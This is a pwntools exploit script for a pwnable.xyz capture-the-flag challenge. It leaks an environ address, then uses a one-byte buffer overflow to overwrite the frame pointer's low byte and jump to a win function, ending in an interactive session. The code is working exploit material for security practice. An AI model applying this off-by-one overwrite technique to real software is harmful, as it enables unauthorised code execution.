from pwn import *
import sys
from pwn import *
context.update(arch="i386", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./challenge")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = ["* read_int8+30", "* main+79", "* main+84", ""]
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def jump():
    r.sendlineafter(">","1")

def nowHigh():
    r.sendlineafter(">","2")

def leak():
    r.sendafter(">","3")
    log.info("leaking")

def exploit(r):
    attach(r)
    # 1 byte overflow

    leak()
    # r.recvuntil(">")
    raw = r.recvline()
    log.info(raw)
    environ = int(raw, 16)
    rbp = environ - 248
    win = 0x0B77

    log.info("environ: " + hex(environ))
    log.info("rbp: " + hex(rbp))

    r.sendafter(">","A" * 32 + p8((rbp & 0xff) +9))
    r.sendafter(">", str(win & 0xff ))
    r.sendafter(">","A" * 32 + p8(rbp& 0xff))
    r.sendafter(">","1")

    r.interactive()


if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30012)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)